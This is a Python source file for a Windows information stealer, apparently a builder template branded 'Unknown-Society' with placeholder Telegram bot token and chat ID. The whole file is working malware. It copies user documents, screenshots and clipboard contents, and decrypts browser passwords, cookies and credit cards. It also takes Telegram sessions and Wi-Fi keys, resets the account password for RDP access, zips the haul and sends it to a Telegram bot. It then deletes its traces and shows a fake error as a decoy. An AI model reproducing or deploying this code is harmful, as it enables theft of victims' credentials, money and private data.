from PIL import ImageGrab
from datetime import timezone, datetime, timedelta
from win32crypt import CryptUnprotectData
from datetime import datetime
import Cryptodome
from Cryptodome.Cipher import AES
from win32com.client import GetObject
import shutil,subprocess,os,psutil,GPUtil,string,random,ctypes
import threading,platform,win32api,time,zipfile,requests
import json,base64,sqlite3,socket
import winreg,re
import win32crypt


def get_files():
    try:
        max_size = 2 * 1024 * 1024
        directories = {'Desktop': 'desktop', 'Documents': 'documents', 'Downloads': 'downloads', 'Videos': 'videos'}
        permissions = 0o777
        destination = "C:\\win_ord\\grabber"
        for source_dir, dest_subdir in directories.items():
            for root, dirs, files in os.walk(os.path.expanduser(f'~/{source_dir}')):
                for file in files:
                    file_path = os.path.join(root, file)
                    if os.path.getsize(file_path) <= max_size:
                        dest_dir = os.path.join(destination, dest_subdir, os.path.relpath(root, os.path.expanduser(f'~/{source_dir}')))
                        os.makedirs(dest_dir, exist_ok=True)
                        os.chmod(dest_dir, permissions)
                        shutil.copy2(file_path, dest_dir)
    except:
        pass



def get_screenshot():
    destination_path = "C:\\win_ord\\screenshots\\webcam.png"
    os.makedirs(os.path.dirname(destination_path), exist_ok=True)
    permissions = 0o777
    os.chmod(destination_path.replace("\\webcam.png",""), permissions)
    screenshot = ImageGrab.grab()
    screenshot.save(destination_path)


def get_clipb_data() -> str:
    destination_path = "C:\\win_ord\\clipboard_data\\clip_board.txt"
    os.makedirs(os.path.dirname(destination_path), exist_ok=True)
    permissions = 0o777
    os.chmod(destination_path.replace("\\clip_board.txt",""), permissions)
    clip = subprocess.run("powershell Get-Clipboard", shell= True, capture_output= True).stdout.decode(errors= 'backslashreplace').strip()
    with open(destination_path,"a") as save:
        save.write(clip+"\n")


def get_systeminfo():
    try:
        def get_size(bytes, suffix="B"):
            factor = 1024
            for unit in ["", "K", "M", "G", "T", "P"]:
                if bytes < factor:
                    return f"{bytes:.2f}{unit}{suffix}"
                bytes /= factor

        uname = platform.uname()
        namepc = "\nPc name: " + str(uname.node)
        countofcpu = psutil.cpu_count(logical=True)
        allcpucount = "\nnumber of CPU cores:" + str(countofcpu) 
        cpufreq = psutil.cpu_freq()
        cpufreqincy = "\nCPU frequency: " + str(cpufreq.max) + 'Mhz'
        svmem = psutil.virtual_memory()
        allram = "\nTotal RAM: " + str(get_size(svmem.total))
        ramfree = "\nAvailable: " + str(get_size(svmem.available))
        ramuseg = "\nUsed: " + str(get_size(svmem.used))
        partitions = psutil.disk_partitions()
        for partition in partitions:
            nameofdevice = "\nDrive: " + str(partition.device)
            nameofdick = "\nDrive volume: " + str(partition.mountpoint)
            typeoffilesystem = "\nFile system type: " + str(partition.fstype)
            try:
                partition_usage = psutil.disk_usage(partition.mountpoint)
            except PermissionError:
                continue
            allstorage = "\nTotal memory: " + str(get_size(partition_usage.total))
            usedstorage = "\nUsed: " + str(get_size(partition_usage.used))
            freestorage = "\nAvailable: " + str(get_size(partition_usage.free))
        try:
            gpus = GPUtil.getGPUs()
            list_gpus = []
            for gpu in gpus:
                gpu_name = "\nType of GPU: " + gpu.name
                gpu_free_memory = "\nAvailable GPU memory: " + f"{gpu.memoryFree}MB"
                gpu_total_memory = "\nTotal GPU memory: " f"{gpu.memoryTotal}MB"
                gpu_temperature = "\nGPU temperature: " f"{gpu.temperature} C"
        except:
            pass


        Antiviruses = {
            'C:\\Program Files\\Windows Defender': 'Windows Defender',
            'C:\\Program Files\\AVAST Software\\Avast': 'Avast',
            'C:\\Program Files\\AVG\\Antivirus': 'AVG',
            'C:\\Program Files (x86)\\Avira\\Launcher': 'Avira',
            'C:\\Program Files (x86)\\IObit\\Advanced SystemCare': 'Advanced SystemCare',
            'C:\\Program Files\\Bitdefender Antivirus Free': 'Bitdefender',
            'C:\\Program Files\\DrWeb': 'Dr.Web',
            'C:\\Program Files\\ESET\\ESET Security': 'ESET',
            'C:\\Program Files (x86)\\Kaspersky Lab': 'Kaspersky Lab',
            'C:\\Program Files (x86)\\360\\Total Security': '360 Total Security',
            'C:\\Program Files\\ESET\\ESET NOD32 Antivirus': 'ESET NOD32',
            'C:\\Program Files\\Malwarebytes\\Anti-Malware': 'Malwarebytes'
            }

        Antivirus = [Antiviruses[d] for d in filter(os.path.exists, Antiviruses)]
        Antiviruses = json.dumps(Antivirus)
        headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0'
        }
        drives = str(win32api.GetLogicalDriveStrings())
        drives = str(drives.split('\000')[:-1])

        try:
            ip = requests.get('https://api.ipify.org').text
            urlloc = 'http://ip-api.com/json/'+ip
            location1 = requests.get(urlloc, headers=headers).text
        except Exception as e:
            pass
        try:
            all_data = "Time: " + time.asctime() + '\n' + "CPU: " + platform.processor() + '\n' + "OS type: " + platform.system() + ' ' + platform.release() + '\nLocation and IP:' + location1 + '\nDrives:' + drives + str(namepc) + str(allcpucount) + str(cpufreq) + str(cpufreqincy) + str(svmem) + str(allram) + str(ramfree) + str(ramuseg) + str(nameofdevice) + str(nameofdick) + str(typeoffilesystem )+ str(allstorage) + str(usedstorage) + str(freestorage)
            destination_path = r"C:\\win_ord\\system_info\\pc-info.txt"
            os.makedirs(os.path.dirname(destination_path), exist_ok=True)
            permissions = 0o777
            os.chmod(destination_path.replace("\\pc-info.txt",""), permissions)
            file = open(destination_path, "w+", encoding='utf-8')
            file.write(all_data)
            file.write('\nAntiviruses: '+str(Antiviruses))
        except Exception as e:
            pass
        try:
            file.write(str(gpu_name) + str(gpu_free_memory) + str(gpu_total_memory) + str(gpu_temperature))
        except:
            pass

        file.close()
        destination_path = r"C:\\win_ord\\system_info\\processes.txt"
        os.makedirs(os.path.dirname(destination_path), exist_ok=True)
        permissions = 0o777
        os.chmod(destination_path.replace("\\processes.txt",""), permissions)
        fileproc = open(r'C:\windll\SystemInformation\processes.txt', 'a', encoding='utf-8')
        result = [process.Properties_('Name').Value for process in GetObject('winmgmts:').InstancesOf('Win32_Process')]
        fileproc.write("\n".join(process for process in result))
        fileproc.close()
    except Exception as e:
        pass


def get_telegram():
    path1 = 'D:\\Telegram Desktop\\tdata'
    path2 = os.environ['USERPROFILE'] + "\\AppData\\Roaming\\Telegram Desktop\\tdata"
    path3 = 'C:\\Program Files\\Telegram Desktop\\tdata'
    destination_path = "C:\\win_ord\\social\\telegram"
    os.makedirs(os.path.dirname(destination_path), exist_ok=True)
    permissions = 0o777
    os.chmod(destination_path, permissions)
    try:
        shutil.copytree(path1,
                destination_path,
                ignore = shutil.ignore_patterns("dumps", "emoji", "tdummy", "user_data", "user_data#2", "user_data#3"))
    except:
        pass
    try:
        shutil.copytree(path2,
                destination_path,
                ignore = shutil.ignore_patterns("dumps", "emoji", "tdummy", "user_data", "user_data#2", "user_data#3"))
    except:
        pass
    try:
        shutil.copytree(path3,
                destination_path,
                ignore = shutil.ignore_patterns("dumps", "emoji", "tdummy", "user_data", "user_data#2", "user_data#3"))
    except:
        pass


def get_browsers_details():
    appdata = os.getenv('LOCALAPPDATA')
    browsers = {
        'C:\\win_ord\\Browsers\\Amigo': appdata + '\\Amigo\\User Data',
        'C:\\win_ord\\Browsers\\Torch': appdata + '\\Torch\\User Data',
        'C:\\win_ord\\Browsers\\Kometa': appdata + '\\Kometa\\User Data',
        'C:\\win_ord\\Browsers\\Orbitum': appdata + '\\Orbitum\\User Data',
        'C:\\win_ord\\Browsers\\Cent-browser': appdata + '\\CentBrowser\\User Data',
        'C:\\win_ord\\Browsers\\7star': appdata + '\\7Star\\7Star\\User Data',
        'C:\\win_ord\\Browsers\\sputnik': appdata + '\\Sputnik\\Sputnik\\User Data',
        'C:\\win_ord\\Browsers\\vivaldi': appdata + '\\Vivaldi\\User Data',
        'C:\\win_ord\\Browsers\\chrome-sxs': appdata + '\\Google\\Chrome SxS\\User Data',
        'C:\\win_ord\\Browsers\\chrome': appdata + '\\Google\\Chrome\\User Data',
        'C:\\win_ord\\Browsers\\epic-privacy-browser': appdata + '\\Epic Privacy Browser\\User Data',
        'C:\\win_ord\\Browsers\\microsoft-edge': appdata + '\\Microsoft\\Edge\\User Data',
        'C:\\win_ord\\Browsers\\uran': appdata + '\\uCozMedia\\Uran\\User Data',
        'C:\\win_ord\\Browsers\\yandex': appdata + '\\Yandex\\YandexBrowser\\User Data',
        'C:\\win_ord\\Browsers\\brave': appdata + '\\BraveSoftware\\Brave-Browser\\User Data',
        'C:\\win_ord\\Browsers\\iridium': appdata + '\\Iridium\\User Data',
    }



    def makdirs():
        os.makedirs(os.path.dirname("C:\\win_ord\\Browsers\\chrome"), exist_ok=True)
        os.makedirs(os.path.dirname("C:\\win_ord\\Browsers\\amigo"), exist_ok=True)
        os.makedirs(os.path.dirname("C:\\win_ord\\Browsers\\microsoft-edge"), exist_ok=True)
        os.makedirs(os.path.dirname("C:\\win_ord\\Browsers\\torch"), exist_ok=True)
        os.makedirs(os.path.dirname("C:\\win_ord\\Browsers\\kometa"), exist_ok=True)
        os.makedirs(os.path.dirname("C:\\win_ord\\Browsers\\orbitum"), exist_ok=True)
        os.makedirs(os.path.dirname("C:\\win_ord\\Browsers\\cent-browser"), exist_ok=True)
        os.makedirs(os.path.dirname("C:\\win_ord\\Browsers\\7star"), exist_ok=True)
        os.makedirs(os.path.dirname("C:\\win_ord\\Browsers\\sputnik"), exist_ok=True)
        os.makedirs(os.path.dirname("C:\\win_ord\\Browsers\\vivaldi"), exist_ok=True)
        os.makedirs(os.path.dirname("C:\\win_ord\\Browsers\\chrome-sxs"), exist_ok=True)
        os.makedirs(os.path.dirname("C:\\win_ord\\Browsers\\epic-privacy-browser"), exist_ok=True)
        os.makedirs(os.path.dirname("C:\\win_ord\\Browsers\\uran"), exist_ok=True)
        os.makedirs(os.path.dirname("C:\\win_ord\\Browsers\\yandex"), exist_ok=True)
        os.makedirs(os.path.dirname("C:\\win_ord\\Browsers\\brave"), exist_ok=True)
        os.makedirs(os.path.dirname("C:\\win_ord\\Browsers\\iridium"), exist_ok=True)
    
    def get_master_key(path: str):
        try:
            if not os.path.exists(path):
                return
            if 'os_crypt' not in open(path + "\\Local State", 'r', encoding='utf-8').read():
                return
            with open(path + "\\Local State", "r", encoding="utf-8") as f:
                c = f.read()
            local_state = json.loads(c)
            master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            master_key = master_key[5:]
            master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
            return master_key
        except:
            pass


    def decrypt_password(buff: bytes, master_key: bytes) -> str:
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)
            decrypted_pass = decrypted_pass[:-16].decode()
            return decrypted_pass
        except:
            pass


    def save_results(browser_name, data_type, content):
        try:
            if not os.path.exists(browser_name):
                os.mkdir(browser_name)
            if content is not None:
                open(f'{browser_name}/{data_type}.txt', 'w').write(content)
            else:
                pass
        except:
            pass


    def get_login_data(path: str, profile: str, master_key):
        try:
            login_db = f'{path}\\{profile}\\Login Data'
            if not os.path.exists(login_db):
                return
            result = ""
            shutil.copy(login_db, 'login_db')
            conn = sqlite3.connect('login_db')
            cursor = conn.cursor()
            cursor.execute('SELECT action_url, username_value, password_value FROM logins')
            for row in cursor.fetchall():
                password = decrypt_password(row[2], master_key)
                result += f"""
                ========================= [Unknown-Society] ============================
                URL: {row[0]}
                Username: {row[1]}
                Password: {password}
                ========================= [Unknown-Society] ============================
                """
            conn.close()
            os.remove('login_db')
            return result
        except:
            pass


    def get_credit_cards(path: str, profile: str, master_key):
        try:
            cards_db = f'{path}\\{profile}\\Web Data'
            if not os.path.exists(cards_db):
                return

            result = ""
            shutil.copy(cards_db, 'cards_db')
            conn = sqlite3.connect('cards_db')
            cursor = conn.cursor()
            cursor.execute(
                'SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards')
            for row in cursor.fetchall():
                if not row[0] or not row[1] or not row[2] or not row[3]:
                    continue
                card_number = decrypt_password(row[3], master_key)
                result += f"""
                ========================= [Unknown-Society] ============================
                Name On Card: {row[0]}
                Card Number: {card_number}
                Expires On:  {row[1]} / {row[2]}
                Added On: {datetime.fromtimestamp(row[4])}
                ========================= [Unknown-Society] ============================
                """
            conn.close()
            os.remove('cards_db')
            return result
        except:
            pass




    def get_cookies(path: str, profile: str, master_key):
        try:
            cookie_db = f'{path}\\{profile}\\Network\\Cookies'
            if not os.path.exists(cookie_db):
                return
            result = ""
            shutil.copy(cookie_db, 'cookie_db')
            conn = sqlite3.connect('cookie_db')
            cursor = conn.cursor()
            cursor.execute('SELECT host_key, name, path, encrypted_value,expires_utc FROM cookies')
            for row in cursor.fetchall():
                if not row[0] or not row[1] or not row[2] or not row[3]:
                    continue

                cookie = decrypt_password(row[3], master_key)
                
                result += f"""
                ========================= [Unknown-Society] ============================
                Host Key : {row[0]}
                Cookie Name : {row[1]}
                Path: {row[2]}
                Cookie: {cookie}
                Expires On: {row[4]}
                
                ============================
                {row[0]}\tTRUE\t\t/FALSE\t2597573456\t{row[1]}\t{cookie}
                ========================= [Unknown-Society] ============================
                """

            conn.close()
            os.remove('cookie_db')
            return result
        except:
            pass


    def get_web_history(path: str, profile: str):
        try:
            web_history_db = f'{path}\\{profile}\\History'
            result = ""
            if not os.path.exists(web_history_db):
                return

            shutil.copy(web_history_db, 'web_history_db')
            conn = sqlite3.connect('web_history_db')
            cursor = conn.cursor()
            cursor.execute('SELECT url, title, last_visit_time FROM urls')
            for row in cursor.fetchall():
                if not row[0] or not row[1] or not row[2]:
                    continue
                result += f"""
                ========================= [Unknown-Society] ============================
                URL: {row[0]}
                Title: {row[1]}
                Visited Time: {row[2]}
                ========================= [Unknown-Society] ============================
                """
            conn.close()
            os.remove('web_history_db')
            return result
        except:
            pass


    def get_downloads(path: str, profile: str):
        try:
            downloads_db = f'{path}\\{profile}\\History'
            if not os.path.exists(downloads_db):
                return
            result = ""
            shutil.copy(downloads_db, 'downloads_db')
            conn = sqlite3.connect('downloads_db')
            cursor = conn.cursor()
            cursor.execute('SELECT tab_url, target_path FROM downloads')
            for row in cursor.fetchall():
                if not row[0] or not row[1]:
                    continue
                result += f"""
                ========================= [Unknown-Society] ============================
                Download URL: {row[0]}
                Local Path: {row[1]}
                ========================= [Unknown-Society] ============================
                """
            conn.close()
            os.remove('downloads_db')
        except:
            pass


    def installed_browsers():
        results = []
        for browser, path in browsers.items():
            if os.path.exists(path):
                results.append(browser)
        return results


    if __name__ == '__main__':
        try:
            available_browsers = installed_browsers()
            makdirs()
            for browser in available_browsers:
                browser_path = browsers[browser]
                master_key = get_master_key(browser_path)
                save_results(browser, 'Passwords', get_login_data(browser_path, "Default", master_key))
                save_results(browser, 'History', get_web_history(browser_path, "Default"))
                save_results(browser, 'Download_History', get_downloads(browser_path, "Default"))
                save_results(browser, 'Cookies', get_cookies(browser_path, "Default", master_key))
                save_results(browser, 'Credit_Cards', get_credit_cards(browser_path, "Default", master_key))
        except:
            pass


def chrome_pass2():
    CHROME_PATH_LOCAL_STATE = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data\Local State"%(os.environ['USERPROFILE']))
    CHROME_PATH = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data"%(os.environ['USERPROFILE']))

    def get_secret_key():
        try:
            with open( CHROME_PATH_LOCAL_STATE, "r", encoding='utf-8') as f:
                local_state = f.read()
                local_state = json.loads(local_state)
            secret_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            secret_key = secret_key[5:] 
            secret_key = win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]
            return secret_key
        except Exception as e:
            return None
        
    def decrypt_payload(cipher, payload):
        return cipher.decrypt(payload)

    def generate_cipher(aes_key, iv):
        return AES.new(aes_key, AES.MODE_GCM, iv)

    def decrypt_password(ciphertext, secret_key):
        try:
            initialisation_vector = ciphertext[3:15]
            encrypted_password = ciphertext[15:-16]
            cipher = generate_cipher(secret_key, initialisation_vector)
            decrypted_pass = decrypt_payload(cipher, encrypted_password)
            decrypted_pass = decrypted_pass.decode()  
            return decrypted_pass
        except Exception as e:
            pass
        
    def get_db_connection(chrome_path_login_db):
        try:
            shutil.copy2(chrome_path_login_db, "Loginvault.db") 
            return sqlite3.connect("Loginvault.db")
        except Exception as e:
            pass
            
    if __name__ == '__main__':
        try:
            destination_path = "C:\\win_ord\\Browsers\\chrome\\password2.txt"
            os.makedirs(os.path.dirname(destination_path), exist_ok=True)
            with open(destination_path, 'w') as decrypt_password_file:
                secret_key = get_secret_key()
                
                folders = [element for element in os.listdir(CHROME_PATH) if re.search("^Profile*|^Default$",element)!=None]
                for folder in folders:
                    chrome_path_login_db = os.path.normpath(r"%s\%s\Login Data"%(CHROME_PATH,folder))
                    conn = get_db_connection(chrome_path_login_db)
                    if(secret_key and conn):
                        cursor = conn.cursor()
                        cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                        for index,login in enumerate(cursor.fetchall()):
                            url = login[0]
                            username = login[1]
                            ciphertext = login[2]
                            if(url!="" and username!="" and ciphertext!=""):
                                decrypted_password = decrypt_password(ciphertext, secret_key)
                                
                                
                                build = f"""========================= [Unknown-Society] ============================\nURL: {url}\nUsername: {username}\nPassword: {decrypted_password}\n========================= [Unknown-Society] ============================\n\n"""
                                decrypt_password_file.write(build)
                        cursor.close()
                        conn.close()
                        os.remove("Loginvault.db")
        except Exception as e:
            pass


def is_admin():
    try:
        subprocess.check_call(["net", "session"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        return True
    except subprocess.CalledProcessError:
        return False


def get_rdp():
    destination_path = "C:\\win_ord\\rdp_info\\"+f"{os.getlogin()}_rdp.txt"
    os.makedirs(os.path.dirname(destination_path), exist_ok=True)
    permissions = 0o777
    os.chmod(destination_path, permissions)
    passs = "RDPPASSWORD"
    pub_ip = requests.get('https://api.ipify.org').text
    host = socket.gethostname()
    priv_ip = socket.gethostbyname(host)
    total_ram = psutil.virtual_memory().total
    ram = ("{:.2f} GB".format(total_ram / (1024**3)))
    system_info = platform.uname()
    system = system_info.system
    node = system_info.node
    release = system_info.release
    version = system_info.version
    machine = system_info.machine
    processor = system_info.processor
    subprocess.check_output(f"net user {os.getlogin()} {passs}",shell=True)
    build = f"========================= [Unknown-Society] ============================Username : {os.getlogin()}\nPublic Ip : {pub_ip}\nPrivate Ip : {priv_ip}\nPassword : {passs}\nRam : {ram}\nSystem : {system}\nNode : {node}\nrelease : {release}\nversion : {version}\nmachine : {machine}\nprocessor : {processor}\n========================= [Unknown-Society] ============================"
    with open("rdp_grb.txt","a") as f:
        f.write(build)
	

def get_wifi():
    destination_path = "C:\\win_ord\\wifi_info\\"+f"{os.getlogin()}_wifi.txt"
    os.makedirs(os.path.dirname(destination_path), exist_ok=True)
    wifi_profiles = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8').split('\n')
    wifi_profiles = [line.split(':')[1][1:-1] for line in wifi_profiles if "All User Profile" in line]
    for profile in wifi_profiles:
        results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', profile, 'key=clear']).decode('utf-8').split('\n')
        results = [line.split(':')[1][1:-1] for line in results if "Key Content" in line]
        build = f"========================= [Unknown-Society] ============================f'Wi-Fi Profile: {profile}, Password: {results[0]}'\n========================= [Unknown-Society] ============================"
        with open(destination_path,"a") as f:
            f.write(build)


def get_productkey():
    destination_path = "C:\\win_ord\\product_key\\"+f"{os.getlogin()}_product_key.txt"
    os.makedirs(os.path.dirname(destination_path), exist_ok=True)
    key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows NT\CurrentVersion")
    value, _ = winreg.QueryValueEx(key, "DigitalProductId")
    product_key = ''.join([hex(x)[2:].zfill(2) for x in value[52:67]]) # Decode the product key from binary to ASCII
    build=("Product key:", product_key)
    with open(destination_path,"a") as f:
            f.write(str(build))


def get_fakeerror(): 
    ctypes.windll.user32.MessageBoxW(None, 'Error code: 0x80070002\nAn internal error occurred while importing modules.', 'Fatal Error', 0)


def generate_random_string(n):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=n))


def zip_and_send_out():
    chat_id =  "CHAT_ID"
    token = "BOT_TOKEN"
    random_string = generate_random_string(15) 
    zip_name = f"{random_string}.zip"
    folder_path = "C:\\win_ord"
    dest_path = "C:\\windll"
    try:
        os.chmod(folder_path, 0o777)
        zip_path = os.path.join(dest_path, zip_name)
        os.makedirs(os.path.dirname("C:\\windll\\"+zip_name), exist_ok=True)
        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zip_file:
            for root, dirs, files in os.walk(folder_path):
                for file in files:
                    file_path = os.path.join(root, file)
                    zip_file.write(file_path, os.path.relpath(file_path, folder_path))
        with open(zip_path, 'rb') as zip_file:
            url = f'https://api.telegram.org/bot{token}/sendDocument'
            msg = f"New LOGS INCOMING"
            files = {'document': zip_file}
            data = {'chat_id': chat_id, 'caption': f'{msg}'}
            response = requests.post(url, files=files, data=data)
        os.remove(zip_path)
        shutil.rmtree(r"C:\\win_ord")
        shutil.rmtree(r"C:\\windll")
    except:
        try:
            os.remove(zip_path)
            shutil.rmtree(r"C:\\win_ord")
            shutil.rmtree(r"C:\\windll")
        except:
            pass


def main():
    check_browser = "browser_id"
    check_clipb = "clipb_id"
    check_files ="file_id"
    check_screen = "screen_id"
    check_product="product_id"
    check_sysinfo = "system_id"
    check_wifi = "wifi_id"
    check_fakeerror = "error_id"
    
    if __name__ == "__main__":
        if check_browser == "on":
            get_browsers_details()
            chrome_pass2()
        if check_clipb == "on":
            get_clipb_data()
        if check_files == "on":
            get_files()
        if check_screen == "on":
            get_screenshot()
        if check_product == "on":
            get_productkey()
        if check_sysinfo == "on":
            get_systeminfo()
        if check_wifi == "on":
            get_wifi()
        zip_and_send_out()
        if check_fakeerror == "on":
            get_fakeerror()
        

    
main()
